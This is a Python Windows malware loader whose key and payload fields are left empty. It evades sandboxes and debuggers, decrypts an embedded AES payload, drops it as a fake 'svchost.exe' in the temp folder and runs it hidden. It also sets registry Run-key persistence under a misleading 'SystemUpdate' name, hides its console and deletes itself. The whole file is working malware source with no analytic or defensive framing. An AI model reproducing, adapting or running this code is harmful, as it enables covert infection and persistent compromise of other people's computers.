import os, sys, base64, tempfile, subprocess, ctypes, time, random, hashlib, winreg
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

KEY_B64 = ""
IV_B64 = ""
ENCRYPTED_DATA = ""

def is_sandbox():
    try:
        import psutil
        if psutil.virtual_memory().total < 4 * 1024**3:
            return True
        if psutil.cpu_count() < 2:
            return True
    except:
        pass
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
    except:
        pass
    return False

if is_sandbox():
    time.sleep(600)
    sys.exit(0)

def decrypt_and_run():
    try:
        key = base64.b64decode(KEY_B64)
        iv = base64.b64decode(IV_B64)
        encrypted = base64.b64decode(ENCRYPTED_DATA)
        
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = unpad(cipher.decrypt(encrypted), AES.block_size)
        
        p = os.path.join(tempfile.gettempdir(), "svchost.exe")
        with open(p, 'wb') as f:
            f.write(decrypted)
        
        subprocess.Popen([p], creationflags=subprocess.CREATE_NO_WINDOW)
    except:
        pass

def add_persistence():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
    except:
        pass

if __name__ == "__main__":
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass
    
    try:
        add_persistence()
        decrypt_and_run()
        time.sleep(2)
        if os.path.exists(sys.argv[0]):
            os.remove(sys.argv[0])
    except:
        pass
    
    sys.exit()